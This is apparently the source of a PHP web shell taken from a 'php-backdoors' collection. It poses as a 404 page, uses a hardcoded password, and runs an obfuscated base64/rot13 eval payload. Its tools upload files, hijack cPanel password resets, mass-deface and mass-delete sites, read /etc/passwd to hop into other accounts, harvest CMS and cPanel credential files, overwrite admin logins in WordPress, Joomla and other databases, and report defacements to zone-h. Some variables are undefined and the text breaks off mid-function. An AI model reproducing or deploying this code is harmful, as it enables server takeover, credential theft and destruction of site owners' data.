<?php 
// from https://github.com/1337r0j4n/php-backdoors
// Priv Shell 
// Silence Because Yourself

error_reporting(0);
header('HTTP/1.0 404 Not Found', true, 404);
session_start();
$pass = "admin";
$link = "fvck.txt";
if($_POST['password'] == $pass) {
  $_SESSION['forbidden'] = $pass;
  echo "<script>window.location='?zet'</script>";
}
if($_GET['page'] == "blank") {
  echo "<a href='?'>Back</a>";
  exit();
}
if(isset($_REQUEST['logout'])) {
  session_destroy();
  echo "<script>window.location='?zet'</script>";
}
if(!($_SESSION['forbidden'])) {
?>
<title>404 Not Found</title>
<meta name="theme color" content="black"> </meta>
<link href="https://fonts.googleapis.com/css?family=Patrick+Hand" rel="stylesheet">
<link href="https://fonts.googleapis.com/css?family=Oxanium&display=swap" rel="stylesheet">

<html>
<head>
	<title>Tak Terlihat Shell</title>
<meta charset="UTF-8"> <meta name="Author" content="Zildan-Sec" /> <meta name="copyright" content="|I<3U|" /<meta name="description" content="Cowok Tersakiti Team" />
</head>
<style>
	input { margin:0;background-color:#fff;border:1px solid #fff; }
</style>
<body bgcolor="white">
<h1>Not Found</h1>
<p>The requested URL was not found on this server.</p>
<p>Additionally, a 404 Not Found
error was encountered while trying to use an ErrorDocument to handle the request.</p>

	<form method="post">
		<input type="password" name="password" placeholder="">
		<br>
		<br>
		<?php echo $_SESSIOM['forbidden']; ?>
	    </form>
	  </td>
	 </table>

<?php 

exit(); 
}
 ?>
<?php
error_reporting(0);
set_time_limit(0);

if(get_magic_quotes_gpc()){
foreach($_POST as $key=>$value){
$_POST[$key] = stripslashes($value);
}
}; eval(str_rot13(gzinflate(str_rot13(base64_decode('cpBEeIMwEIDf/RVOhCh1XO3TLB2sndq9jOHDHiYSWaYRW6yeWiD++rWm0MHyktx93GqXZksrayvQFjk0zZP3PCmwuenrx2qOWFGQHdvkP97vknnBD5LkYoc8zegh+cLlxpqUBm0BTgdJCahR428pBI/DY/UckTWJojVMPYWXV8lTVh51DbI5UFS45NhURq8b8EQjd+h04zheXddVgFtL6G0WH1PbF3Fvk4N+hBqjW9r+NK0DZOIQo55mrYZeKEmFx6DrumBv9Ry0tYZ3YCOMtv/wzCAkG40H72p2hv/A+5eW3rch6LlIbaQ/LdQnt8BzqwtozLv0WWjpW6Xnen4B')))));
echo '<!DOCTYPE HTML>
<html>
<head>
  <link href="https://fonts.googleapis.com/css?family=Black+Ops+One" rel="stylesheet">
  <link href="https://fonts.googleapis.com/css?family=Merienda" rel="stylesheet">
  <link href="https://fonts.googleapis.com/css?family=Kelly+Slab" rel="stylesheet" type="text/css">
<link href="https://fonts.googleapis.com/css?family=Sedgwick+Ave+Display" rel="stylesheet">
<title>WELCOME TO Tak Terlihat Shell</title>
<meta property="og:image" src="https://i.gifer.com/7M1g.gif"/>
<style>
body{
font-family: Kelly Slab;
background-color: black;
color:white;
}
#content tr:hover{
background-color: #00ddff;
text-shadow:0px 0px 10px #fff;
}
#content .first{
background-color: #00ddff;
color:white
}
table{
border: 1px #000000;
}
a{
color:white;
font-size: 19px;
text-decoration:none;
}
a:hover{
color:green;
text-shadow:0px 0px 10px #ffffff;
}
input,select,textarea{
border: 2px #000000 solid;
-moz-border-radius: 5px;
-webkit-border-radius:5px;
border-radius:5px;
}
h2{
font-family:Kelly Slab;
font-size:25px;
color:white;
}
h3{
font-size:35px;
}
h4{
font-size:15px;
font-family:Kelly Slab;
color:white;
}
.destroy_table {;
  background:transparent;
  border:1px solid #00ddff;
  font-family:Kelly Slab;
    display:inline-block;
  cursor:pointer;
  color:yellow;
  font-size:17x;
  font-weight:bold;
  padding:3px 20px;
  text-decoration:white;
  text-shadow:0px 0px 0px #ff0505;
       }
       .td_table {;
  background-color: #000000;
            background-image: url(https://i.gifer.com/2f6g.gif);
            background-repeat: no-repeat;
            background-attachment: fixed;
            background-size: 100%  100%;   
border: 1px solid gold; 
padding: 0px; 
margin-left: 2px; 
text-align: center;
}
     .potext {
  border: 1px solid #ffffff;
  width: 100%;
  height: 400px;
  padding-left: 5px;
  margin: 10px auto;
  resize: none;
  background-color: #000000;
            background-image: url(https://i.gifer.com/2f6g.gif);
            background-repeat: no-repeat;
            background-attachment: fixed;
            background-size: 100%  100%;   
  color: #ffffff;
  font-family:Kelly Slab;
  font-size: 13px;
}
.pl{
background:transparent; 
border: 1px solid red; 
padding: 5px; 
margin-left: 20px; 
text-align: center;
}
.pt{
background:transparent; 
border: 1px solid red; 
padding: 5px; 
margin-left: 20px; 
text-align: left;
}
</style>
</head>
<body>
<center>
<br>
<font face="Kelly Slab" color="white" size="7px">WELCOME TO Tak Terlihat Shell</font><br>
</h1></center>
<center><b><font face="courier new" color="white" size="5">� Subcribe Info Cyber Hacker �</font></b></center>
<marquee><b><fonte face="courier new" color="white" size="4">Cowok Tersakiti Team - JawaBaratCyber - And All My Friend</font></b></marquee>
<center><audio autoplay="autoplay" controls="controls" src="https://h.top4top.io/m_16378jw0k0.m3" type="audio/mpeg"></audio></center>
<table width="100%" border="0" cellpadding="0" cellspacing="0" align="left">
<tr><td>';
echo "<tr><td><font color='white'>
+ IP Kamu Syg    <td>: <font color='LightBlue'>".$_SERVER['REMOTE_ADDR']."<tr><td><font color='white'>
+ IP Server  <td>: <font color='LightBlue'>".gethostbyname($_SERVER['HTTP_HOST'])."<tr><td><font color='white'>
+ system     <td>: <font color='LightBlue'>".php_uname()."<tr><td><font color='white'>
+ Coded By   <td>: <font color='LightBlue'>Zildan-Sec<tr><td><font color='white'>
+ Website<td>: <font color='LightBlue'>Zildan-Sec.my.id<tr><td><font color='white'>
+ Youtube <td>: <font color='LightBlue'>Info Cyber Hacker</font></tr></td><br>
</table>";
echo '<table width="100%" border="0" cellpadding="0" cellspacing="0" align="center">
<center><tr align="center"><td align="center">path : ';
if(isset($_GET['path'])){
$path = $_GET['path'];
}else{
$path = getcwd();
}
$path = str_replace('\\','/',$path);
$paths = explode('/',$path);

foreach($paths as $id=>$pat){
if($pat == '' && $id == 0){
$a = true;
echo '<a href="?path=/">/</a>';
continue;
}
if($pat == '') continue;
echo '<a href="?path=';
for($i=0;$i<=$id;$i++){
echo "$paths[$i]";
if($i != $id) echo "/";
}
echo '">'.$pat.'</a>/';
}

if(isset($_FILES['file'])){
if(copy($_FILES['file']['tmp_name'],$path.'/'.$_FILES['file']['name'])){
echo '<font color="yellow">UPLOADED SUCCES !!!!!</script><br/>';
}else{
echo '<script> alert("UPLOADED FAILED COK !!!!!")</script></font><br/>';
}
}
echo '</tr><tr align="center"><td align="center"><form enctype="multipart/form-data" method="POST">
<font color="white"><br><b></font><input type="file"name="file" style="widht:900px;font-family:Kelly Slab;font-size:20;background:transparent;color:white;border:2px solid red;"/>
<input type="submit" value="Upload" style="margin-top:4px;width:150px;font-family:Kelly Slab;font-size:20;background:transparent;color:white;border:2px solid red;border-radius:5px"/><br><br>
</form></center>';
echo "</td></tr>";
echo "</table>";
echo "<center>";
echo "<center><table id='menu' width='990' border='0' cellpadding='0' cellspacing='0'><tr><td>";
echo "<a class='destroy_table' href='?'>Home</a>";
echo "<a class='destroy_table' href='?dir=$dir&do=cmd'>cp_reset_pw</a>";
echo "<a class='destroy_table' href='?logout=true'>Logout</a>";
echo "<a class='destroy_table' href='?dir=$dir&to=zoneh'>Zone-h</a>";
echo "<a class='destroy_table' href='?dir=$dir&to=jumping'>Jumping</a>";
echo "<a class='destroy_table' href='?dir=$dir&to=sym'>Symlink</a>";
echo "<a class='destroy_table' href='?dir=$dir&to=mass'>Mass_deface</a>";
echo "<a class='destroy_table' href='?dir=$dir&to=masse'>Mass_delete</a><br>";
echo "<a class='destroy_table' href='?dir=$dir&to=config'>Config_grab</a>";
echo "<a class='destroy_table' href='?dir=$dir&do=auto_edit_user'>auto_edit_user</a>";
echo "<a class='destroy_table' href='?dir=$dir&do=endec'>End/Decode</a>";
echo "<a class='destroy_table' href='?dir=$dir&do=hashgen'>Hash Generator</a>";
echo "<a class='destroy_table' href='?dir=$dir&do=adminer'>Adminer</a>";
echo "<a class='destroy_table' href='?dir=$dir&to=cmd'>Command</a>";
echo "<a class='destroy_table' href='?dir=$dir&do=about'>About</a>";
echo "</center>";
if($_GET['do'] == 'cmd') {
	echo'<header> 
	<pre> 
	- Cpanel Reset Password</pre> 
	</header> 
	</center> 
	<form action="#" method="post"> 	 <input type="email" name="email" placeholder="Email Lu Tong" /> 	 <input type="submit" name="submit" value="Crack"/> 	 
	</form> 	 	 
	<br/><br/><br/> 
	</p>'; ?> <?php $IIIIIIIIIIII = get_current_user(); $IIIIIIIIIII1 = $_SERVER['HTTP_HOST']; $IIIIIIIIIIlI = getenv('REMOTE_ADDR'); if (isset($_POST['submit'])) { $email = $_POST['email']; $IIIIIIIIIIl1 = 'email:' . $email; $IIIIIIIIII1I = fopen('/home/' . $IIIIIIIIIIII . '/.cpanel/contactinfo', 'w'); fwrite($IIIIIIIIII1I, $IIIIIIIIIIl1); fclose($IIIIIIIIII1I); $IIIIIIIIII1I = fopen('/home/' . $IIIIIIIIIIII . '/.contactinfo', 'w'); fwrite($IIIIIIIIII1I, $IIIIIIIIIIl1); fclose($IIIIIIIIII1I); $IIIIIIIIIlIl = "https://"; $IIIIIIIIIlI1 = "2083"; $IIIIIIIIIllI = $IIIIIIIIIII1 . ':2083/resetpass?start=1'; $read_named_conf = @file('/home/' . $IIIIIIIIIIII . '/.cpanel/contactinfo'); if(!$read_named_conf) { echo "<h1>Gak Bisa Di Akses Sayang??</h1>
	<br><br> 
	</pre>
	</center>"; } else { echo "<center>Salin<br><br>
	</center>"; echo '<center><input type="text" value="' . $IIIIIIIIIIII . '" id="user"> <button onclick="username()">Salin User</button></center> <script>function username() { var copyText = document.getElementById("user"); copyText.select(); document.execCommand("copy"); } </script> '; echo '<br/><center><a target="_blank" href="' . $IIIIIIIIIlIl . '' . $IIIIIIIIIllI . '">Gass Disini</a><br><br></center>'; ;}}
	echo '</td></tr><tr><td>';
	}
 elseif($_GET['logout'] == true) {
	unset($_SESSION[md5($_SERVER['HTTP_HOST'])]);
	echo "<script>window.location='?';</script>";
}

if($_GET['to'] == 'zoneh') {
	if($_POST['submit']) {
		$domain = explode("\r\n", $_POST['url']);
		$nick =  $_POST['nick'];
		echo "Defacer Onhold: <a href='http://www.zone-h.org/archive/notifier=$nick/published=0' target='_blank'>http://www.zone-h.org/archive/notifier=$nick/published=0</a><br>";
		echo "Defacer Archive: <a href='http://www.zone-h.org/archive/notifier=$nick' target='_blank'>http://www.zone-h.org/archive/notifier=$nick</a><br><br>";
		function zoneh($url,$nick) {
			$ch = curl_init("http://www.zone-h.com/notify/single");
				  curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
				  curl_setopt($ch, CURLOPT_POST, true);
				  curl_setopt($ch, CURLOPT_POSTFIELDS, "defacer=$nick&domain1=$url&hackmode=1&reason=1&submit=Send");
			return curl_exec($ch);
				  curl_close($ch);
		}
		foreach($domain as $url) {
			$zoneh = zoneh($url,$nick);
			if(preg_match("/color=\"red\">OK<\/font><\/li>/i", $zoneh)) {
				echo "$url -> <font color=lime>OK</font><br>";
			} else {
				echo "$url -> <font color=red>ERROR</font><br>";
			}
		}
	} else {
		echo "<center><form method='post'>
		<u>Defacer</u>: <br>
		<input type='text' name='nick' size='50' value='Mr.Z'><br>
		<u>Domains</u>: <br>
		<textarea style='width: 450px; height: 150px;' name='url'></textarea><br>
		<input type='submit' name='submit' value='Submit' style='width: 450px;'>
		</form>";
	}
	echo "</center>";
} elseif($_GET['to'] == 'mass') {
	function sabun_massal($dir,$namafile,$isi_script) {
		if(is_writable($dir)) {
			$dira = scandir($dir);
			foreach($dira as $dirb) {
				$dirc = "$dir/$dirb";
				$lokasi = $dirc.'/'.$namafile;
				if($dirb === '.') {
					file_put_contents($lokasi, $isi_script);
				} elseif($dirb === '..') {
					file_put_contents($lokasi, $isi_script);
				} else {
					if(is_dir($dirc)) {
						if(is_writable($dirc)) {
							echo "[<font color=lime>DONE</font>] $lokasi<br>";
							file_put_contents($lokasi, $isi_script);
							$idx = sabun_massal($dirc,$namafile,$isi_script);
						}
					}
				}
			}
		}
	}
	function sabun_biasa($dir,$namafile,$isi_script) {
		if(is_writable($dir)) {
			$dira = scandir($dir);
			foreach($dira as $dirb) {
				$dirc = "$dir/$dirb";
				$lokasi = $dirc.'/'.$namafile;
				if($dirb === '.') {
					file_put_contents($lokasi, $isi_script);
				} elseif($dirb === '..') {
					file_put_contents($lokasi, $isi_script);
				} else {
					if(is_dir($dirc)) {
						if(is_writable($dirc)) {
							echo "[<font color=lime>DONE</font>] $dirb/$namafile<br>";
							file_put_contents($lokasi, $isi_script);
						}
					}
				}
			}
		}
	}
	if($_POST['start']) {
		if($_POST['tipe_sabun'] == 'mahal') {
			echo "<div style='margin: 5px auto; padding: 5px'>";
			sabun_massal($_POST['d_dir'], $_POST['d_file'], $_POST['script']);
			echo "</div>";
		} elseif($_POST['tipe_sabun'] == 'murah') {
			echo "<div style='margin: 5px auto; padding: 5px'>";
			sabun_biasa($_POST['d_dir'], $_POST['d_file'], $_POST['script']);
			echo "</div>";
		}
	} else {
	echo "<center>";
	echo "<form method='post'>
	<font style='text-decoration: underline;'>Tipe Mass:</font><br>
	<input type='radio' name='tipe_sabun' value='murah' checked>Biasa<input type='radio' name='tipe_sabun' value='mahal'>Massal<br>
	<font style='text-decoration: underline;'>Folder:</font><br>
	<input type='text' name='d_dir' value='$dir' style='width: 450px;' height='10'><br>
	<font style='text-decoration: underline;'>Filename:</font><br>
	<input type='text' name='d_file' value='ini.html' style='width: 450px;' height='10'><br>
	<font style='text-decoration: underline;'>Index File:</font><br>
	<textarea name='script' style='width: 450px; height: 200px;'>By Mr.Z</textarea><br>
	<input type='submit' name='start' value='ENTOT COK!' style='width: 450px;'>
	</form></center>";
	} 
	}elseif($_GET['to'] == 'sym') {
echo '<hr>'; 
} elseif($_GET['to'] == 'jumping') {
	$i = 0;
	echo "<div class='margin: 5px auto;'>";
	if(preg_match("/hsphere/", $dir)) {
		$urls = explode("\r\n", $_POST['url']);
		if(isset($_POST['jump'])) {
			echo "<pre>";
			foreach($urls as $url) {
				$url = str_replace(array("http://","www."), "", strtolower($url));
				$etc = "/etc/passwd";
				$f = fopen($etc,"r");
				while($gets = fgets($f)) {
					$pecah = explode(":", $gets);
					$user = $pecah[0];
					$dir_user = "/hsphere/local/home/$user";
					if(is_dir($dir_user) === true) {
						$url_user = $dir_user."/".$url;
						if(is_readable($url_user)) {
							$i++;
							$jrw = "[<font color=lime>R</font>] <a href='?dir=$url_user'><font color=gold>$url_user</font></a>";
							if(is_writable($url_user)) {
								$jrw = "[<font color=lime>RW</font>] <a href='?dir=$url_user'><font color=gold>$url_user</font></a>";
							}
							echo $jrw."<br>";
						}
					}
				}
			}
		if($i == 0) { 
		} else {
			echo "<br>Total ada ".$i." Kamar di ".$ip;
		}
		echo "</pre>";
		} else {
			echo '<center>
				  <form method="post">
				  List Domains: <br>
				  <textarea name="url" style="width: 500px; height: 250px;">';
			$fp = fopen("/hsphere/local/config/httpd/sites/sites.txt","r");
			while($getss = fgets($fp)) {
				echo $getss;
			}
			echo  '</textarea><br>
				  <input type="submit" value="Jumping" name="jump" style="width: 500px; height: 25px;">
				  </form></center>';
		}
	} elseif(preg_match("/vhosts|vhost/", $dir)) {
		preg_match("/\/var\/www\/(.*?)\//", $dir, $vh);
		$urls = explode("\r\n", $_POST['url']);
		if(isset($_POST['jump'])) {
			echo "<pre>";
			foreach($urls as $url) {
				$url = str_replace("www.", "", $url);
				$web_vh = "/var/www/".$vh[1]."/$url/httpdocs";
				if(is_dir($web_vh) === true) {
					if(is_readable($web_vh)) {
						$i++;
						$jrw = "[<font color=lime>R</font>] <a href='?dir=$web_vh'><font color=gold>$web_vh</font></a>";
						if(is_writable($web_vh)) {
							$jrw = "[<font color=lime>RW</font>] <a href='?dir=$web_vh'><font color=gold>$web_vh</font></a>";
						}
						echo $jrw."<br>";
					}
				}
			}
		if($i == 0) { 
		} else {
			echo "<br>Total ada ".$i." Kamar di ".$ip;
		}
		echo "</pre>";
		} else {
			echo '<center>
				  <form method="post">
				  List Domains: <br>
				  <textarea name="url" style="width: 500px; height: 250px;">';
				  bing("ip:$ip");
			echo  '</textarea><br>
				  <input type="submit" value="Jumping" name="jump" style="width: 500px; height: 25px;">
				  </form></center>';
		}
	} else {
		echo "<pre>";
		$etc = fopen("/etc/passwd", "r") or die("<font color=red>Can't read /etc/passwd</font>");
		while($passwd = fgets($etc)) {
			if($passwd == '' || !$etc) {
				echo "<font color=red>Can't read /etc/passwd</font>";
			} else {
				preg_match_all('/(.*?):x:/', $passwd, $user_jumping);
				foreach($user_jumping[1] as $user_idx_jump) {
					$user_jumping_dir = "/home/$user_idx_jump/public_html";
					if(is_readable($user_jumping_dir)) {
						$i++;
						$jrw = "[<font color=limeBlue>R</font>] <a href='?dir=$user_jumping_dir'><font color=gold>$user_jumping_dir</font></a>";
						if(is_writable($user_jumping_dir)) {
							$jrw = "[<font color=lime>RW</font>] <a href='?dir=$user_jumping_dir'><font color=gold>$user_jumping_dir</font></a>";
						}
						echo $jrw;
						if(function_exists('posix_getpwuid')) {
							$domain_jump = file_get_contents("/etc/named.conf");	
							if($domain_jump == '') {
								echo " => ( <font color=red>gabisa ambil nama domain nya</font> )<br>";
							} else {
								preg_match_all("#/var/named/(.*?).db#", $domain_jump, $domains_jump);
								foreach($domains_jump[1] as $dj) {
									$user_jumping_url = posix_getpwuid(@fileowner("/etc/valiases/$dj"));
									$user_jumping_url = $user_jumping_url['name'];
									if($user_jumping_url == $user_idx_jump) {
										echo " => ( <u>$dj</u> )<br>";
										break;
									}
								}
							}
						} else {
							echo "<br>";
						}
					}
				}
			}
		}
		if($i == 0) { 
		} else {
			echo "<br>Total ada ".$i." Kamar di ".$ip;
		}
		echo "</pre>";
	}
	echo "</div>";
}  //MASS DELETE/////////////////////////
elseif($_GET['to'] == 'masse') {
   function hapus_massal($dir,$namafile) {
if(is_writable($dir)) {
   $dira = scandir($dir);
   foreach($dira as $dirb) {
       $dirc = "$dir/$dirb";
       $lokasi = $dirc.'/'.$namafile;
       if($dirb === '.') {
           if(file_exists("$dir/$namafile")) {
               unlink("$dir/$namafile");
           }
       } elseif($dirb === '..') {
           if(file_exists("".dirname($dir)."/$namafile")) {
               unlink("".dirname($dir)."/$namafile");
           }
       } else {
           if(is_dir($dirc)) {
               if(is_writable($dirc)) {
                   if(file_exists($lokasi)) {
                       echo "[<font color=#52CF38>Terhapus</font>] $lokasi<br>";
                       unlink($lokasi);
                       $idx = hapus_massal($dirc,$namafile);
                   }
               }
           }
       }
   }
}
   }
   if($_POST['start']) {
echo "<div style='margin: 5px auto; padding: 5px'>";
hapus_massal($_POST['d_dir'], $_POST['d_file']);
echo "</div>";
   } else {
   echo "<center>";
   echo "<form method='post'>
   <font>Folder :</font><br>
   <input type='text' name='d_dir' value='$path' style='width: 450px;' height='10'><br>
   <font>Filename :</font><br>
   <input type='text' name='d_file' value='nyawa lu aja mass delete gan:v' style='width: 450px;' height='10'><br>
   <input type='submit' name='start' value='Mass Delete' style='width: 450px;'>
   </form></center>";
   }
   //CONFIG///////////
   } elseif($_GET['to'] == 'config') {
   $etc = fopen("/etc/passwd", "r") or die("<pre><font color=#666>Can't read /etc/passwd</font></pre>");
   $idx = mkdir("zet_CONFIG", 0777);
   $isi_htc = "Options all\nRequire None\nSatisfy Any";
   $htc = fopen("zet_CONFIG/.htaccess","w");
   fwrite($htc, $isi_htc);
   while($passwd = fgets($etc)) {
   if($passwd == "" || !$etc) {
   echo "<font color=#666>Can't read /etc/passwd</font>";
   } else {
   preg_match_all('/(.*?):x:/', $passwd, $user_config);
   foreach($user_config[1] as $user_3X0RC1ST) {
   $user_config_dir = "/home/$user_zet/public_html/";
   if(is_readable($user_config_dir)) {
   $grab_config = array(
   "/home/$user_zet/.my.cnf" => "cpanel",
   "/home/$user_zet/.accesshash" => "WHM-accesshash",
   "/home/$user_zet/public_html/vdo_config.php" => "Voodoo",
   "/home/$user_zet/public_html/bw-configs/config.ini" => "BosWeb",
   "/home/$user_zet/public_html/config/koneksi.php" => "Lokomedia",
   "/home/$user_zet/public_html/lokomedia/config/koneksi.php" => "Lokomedia",
   "/home/$user_zet/public_html/clientarea/configuration.php" => "WHMCS",
   "/home/$user_zet/public_html/whm/configuration.php" => "WHMCS",
   "/home/$user_zet/public_html/whmcs/configuration.php" => "WHMCS",
   "/home/$user_zet/public_html/forum/config.php" => "phpBB",
   "/home/$user_zet/public_html/sites/default/settings.php" => "Drupal",
   "/home/$user_zet/public_html/config/settings.inc.php" => "PrestaShop",
   "/home/$user_zet/public_html/app/etc/local.xml" => "Magento",
   "/home/$user_zet/public_html/joomla/configuration.php" => "Joomla",
   "/home/$user_zet/public_html/configuration.php" => "Joomla",
   "/home/$user_zet/public_html/wp/wp-config.php" => "WordPress",
   "/home/$user_zet/public_html/wordpress/wp-config.php" => "WordPress",
   "/home/$user_zet/public_html/wp-config.php" => "WordPress",
   "/home/$user_zet/public_html/admin/config.php" => "OpenCart",
   "/home/$user_zet/public_html/slconfig.php" => "Sitelok",
   "/home/$user_zet/public_html/application/config/database.php" => "Ellislab");
   foreach($grab_config as $config => $nama_config) {
   $ambil_config = file_get_contents($config);
   if($ambil_config == '') {
   } else {	
   $file_config = fopen("3X0RC1ST_CONFIG/$user_jefri-$nama_config.txt","w");
   fputs($file_config,$ambil_config);
   }
   }
   }      
   }
   }  
   }
   echo "<center><a href='?path=$path/3X0RC1ST_CONFIG'><font color=#52CF38>Selesai!</font></a></center>";
 
 } elseif($_GET['do'] == 'auto_edit_user') {
 if($_POST['hajar']) {
 if(strlen($_POST['pass_baru']) < 6 OR strlen($_POST['user_baru']) < 6) {
 echo "username atau password harus lebih dari 6 karakter";
 } else {
 $user_baru = $_POST['user_baru'];
 $pass_baru = md5($_POST['pass_baru']);
 $conf = $_POST['config_dir'];
 $scan_conf = scandir($conf);
 foreach($scan_conf as $file_conf) {
 if(!is_file("$conf/$file_conf")) continue;
 $config = file_get_contents("$conf/$file_conf");
 if(preg_match("/JConfig|joomla/",$config)) {
 $dbhost = ambilkata($config,"host = '","'");
 $dbuser = ambilkata($config,"user = '","'");
 $dbpass = ambilkata($config,"password = '","'");
 $dbname = ambilkata($config,"db = '","'");
 $dbprefix = ambilkata($config,"dbprefix = '","'");
 $prefix = $dbprefix."users";
 $conn = mysql_connect($dbhost,$dbuser,$dbpass);
 $db = mysql_select_db($dbname);
 $q = mysql_query("SELECT * FROM $prefix ORDER BY id ASC");
 $result = mysql_fetch_array($q);
 $id = $result['id'];
 $site = ambilkata($config,"sitename = '","'");
 $update = mysql_query("UPDATE $prefix SET username='$user_baru',password='$pass_baru' WHERE id='$id'");
 echo "Config => ".$file_conf."<br>";
 echo "CMS => Joomla<br>";
 if($site == '') {
 echo "Sitename => <font color=red>error, gabisa ambil nama domain nya</font><br>";
 } else {
 echo "Sitename => $site<br>";
 }
 if(!$update OR !$conn OR !$db) {
 echo "Status => <font color=red>".mysql_error()."</font><br><br>";
 } else {
 echo "Status => <font color=lime>sukses edit user, silakan login dengan user & pass yang baru.</font><br><br>";
 }
 mysql_close($conn);
 } elseif(preg_match("/WordPress/",$config)) {
 $dbhost = ambilkata($config,"DB_HOST', '","'");
 $dbuser = ambilkata($config,"DB_USER', '","'");
 $dbpass = ambilkata($config,"DB_PASSWORD', '","'");
 $dbname = ambilkata($config,"DB_NAME', '","'");
 $dbprefix = ambilkata($config,"table_prefix  = '","'");
 $prefix = $dbprefix."users";
 $option = $dbprefix."options";
 $conn = mysql_connect($dbhost,$dbuser,$dbpass);
 $db = mysql_select_db($dbname);
 $q = mysql_query("SELECT * FROM $prefix ORDER BY id ASC");
 $result = mysql_fetch_array($q);
 $id = $result[ID];
 $q2 = mysql_query("SELECT * FROM $option ORDER BY option_id ASC");
 $result2 = mysql_fetch_array($q2);
 $target = $result2[option_value];
 if($target == '') {
 $url_target = "Login => <font color=red>error, gabisa ambil nama domain nyaa</font><br>";
 } else {
 $url_target = "Login => <a href='$target/wp-login.php' target='_blank'><u>$target/wp-login.php</u></a><br>";
 }
 $update = mysql_query("UPDATE $prefix SET user_login='$user_baru',user_pass='$pass_baru' WHERE id='$id'");
 echo "Config => ".$file_conf."<br>";
 echo "CMS => Wordpress<br>";
 echo $url_target;
 if(!$update OR !$conn OR !$db) {
 echo "Status => <font color=red>".mysql_error()."</font><br><br>";
 } else {
 echo "Status => <font color=lime>sukses edit user, silakan login dengan user & pass yang baru.</font><br><br>";
 }
 mysql_close($conn);
 } elseif(preg_match("/Magento|Mage_Core/",$config)) {
 $dbhost = ambilkata($config,"<host><![CDATA[","]]></host>");
 $dbuser = ambilkata($config,"<username><![CDATA[","]]></username>");
 $dbpass = ambilkata($config,"<password><![CDATA[","]]></password>");
 $dbname = ambilkata($config,"<dbname><![CDATA[","]]></dbname>");
 $dbprefix = ambilkata($config,"<table_prefix><![CDATA[","]]></table_prefix>");
 $prefix = $dbprefix."admin_user";
 $option = $dbprefix."core_config_data";
 $conn = mysql_connect($dbhost,$dbuser,$dbpass);
 $db = mysql_select_db($dbname);
 $q = mysql_query("SELECT * FROM $prefix ORDER BY user_id ASC");
 $result = mysql_fetch_array($q);
 $id = $result[user_id];
 $q2 = mysql_query("SELECT * FROM $option WHERE path='web/secure/base_url'");
 $result2 = mysql_fetch_array($q2);
 $target = $result2[value];
 if($target == '') {
 $url_target = "Login => <font color=red>error, gabisa ambil nama domain nyaa</font><br>";
 } else {
 $url_target = "Login => <a href='$target/admin/' target='_blank'><u>$target/admin/</u></a><br>";
 }
 $update = mysql_query("UPDATE $prefix SET username='$user_baru',password='$pass_baru' WHERE user_id='$id'");
 echo "Config => ".$file_conf."<br>";
 echo "CMS => Magento<br>";
 echo $url_target;
 if(!$update OR !$conn OR !$db) {
 echo "Status => <font color=red>".mysql_error()."</font><br><br>";
 } else {
 echo "Status => <font color=lime>sukses edit user, silakan login dengan user & pass yang baru.</font><br><br>";
 }
 mysql_close($conn);
 } elseif(preg_match("/HTTP_SERVER|HTTP_CATALOG|DIR_CONFIG|DIR_SYSTEM/",$config)) {
 $dbhost = ambilkata($config,"'DB_HOSTNAME', '","'");
 $dbuser = ambilkata($config,"'DB_USERNAME', '","'");
 $dbpass = ambilkata($config,"'DB_PASSWORD', '","'");
 $dbname = ambilkata($config,"'DB_DATABASE', '","'");
 $dbprefix = ambilkata($config,"'DB_PREFIX', '","'");
 $prefix = $dbprefix."user";
 $conn = mysql_connect($dbhost,$dbuser,$dbpass);
 $db = mysql_select_db($dbname);
 $q = mysql_query("SELECT * FROM $prefix ORDER BY user_id ASC");
 $result = mysql_fetch_array($q);
 $id = $result[user_id];
 $target = ambilkata($config,"HTTP_SERVER', '","'");
 if($target == '') {
 $url_target = "Login => <font color=red>error, gabisa ambil nama domain nyaa</font><br>";
 } else {
 $url_target = "Login => <a href='$target' target='_blank'><u>$target</u></a><br>";
 }
 $update = mysql_query("UPDATE $prefix SET username='$user_baru',password='$pass_baru' WHERE user_id='$id'");
 echo "Config => ".$file_conf."<br>";
 echo "CMS => OpenCart<br>";
 echo $url_target;
 if(!$update OR !$conn OR !$db) {
 echo "Status => <font color=red>".mysql_error()."</font><br><br>";
 } else {
 echo "Status => <font color=lime>sukses edit user, silakan login dengan user & pass yang baru.</font><br><br>";
 }
 mysql_close($conn);
 } elseif(preg_match("/panggil fungsi validasi xss dan injection/",$config)) {
 $dbhost = ambilkata($config,'server = "','"');
 $dbuser = ambilkata($config,'username = "','"');
 $dbpass = ambilkata($config,'password = "','"');
 $dbname = ambilkata($config,'database = "','"');
 $prefix = "users";
 $option = "identitas";
 $conn = mysql_connect($dbhost,$dbuser,$dbpass);
 $db = mysql_select_db($dbname);
 $q = mysql_query("SELECT * FROM $option ORDER BY id_identitas ASC");
 $result = mysql_fetch_array($q);
 $target = $result[alamat_website];
 if($target == '') {
 $target2 = $result[url];
 $url_target = "Login => <font color=red>error, gabisa ambil nama domain nyaa</font><br>";
 if($target2 == '') {
 $url_target2 = "Login => <font color=red>error, gabisa ambil nama domain nyaa</font><br>";
 } else {
 $cek_login3 = file_get_contents("$target2/adminweb/");
 $cek_login4 = file_get_contents("$target2/lokomedia/adminweb/");
 if(preg_match("/CMS Lokomedia|Administrator/", $cek_login3)) {
 $url_target2 = "Login => <a href='$target2/adminweb' target='_blank'><u>$target2/adminweb</u></a><br>";
 } elseif(preg_match("/CMS Lokomedia|Lokomedia/", $cek_login4)) {
 $url_target2 = "Login => <a href='$target2/lokomedia/adminweb' target='_blank'><u>$target2/lokomedia/adminweb</u></a><br>";
 } else {
 $url_target2 = "Login => <a href='$target2' target='_blank'><u>$target2</u></a> [ <font color=red>gatau admin login nya dimana :p</font> ]<br>";
 }
 }
 } else {
 $cek_login = file_get_contents("$target/adminweb/");
 $cek_login2 = file_get_contents("$target/lokomedia/adminweb/");
 if(preg_match("/CMS Lokomedia|Administrator/", $cek_login)) {
 $url_target = "Login => <a href='$target/adminweb' target='_blank'><u>$target/adminweb</u></a><br>";
 } elseif(preg_match("/CMS Lokomedia|Lokomedia/", $cek_login2)) {
 $url_target = "Login => <a href='$target/lokomedia/adminweb' target='_blank'><u>$target/lokomedia/adminweb</u></a><br>";
 } else {
 $url_target = "Login => <a href='$target' target='_blank'><u>$target</u></a> [ <font color=red>gatau admin login nya dimana :p</font> ]<br>";
 }
 }
 $update = mysql_query("UPDATE $prefix SET username='$user_baru',password='$pass_baru' WHERE level='admin'");
 echo "Config => ".$file_conf."<br>";
 echo "CMS => Lokomedia<br>";
 if(preg_match('/error, gabisa ambil nama domain nya/', $url_target)) {
 echo $url_target2;
 } else {
 echo $url_target;
 }
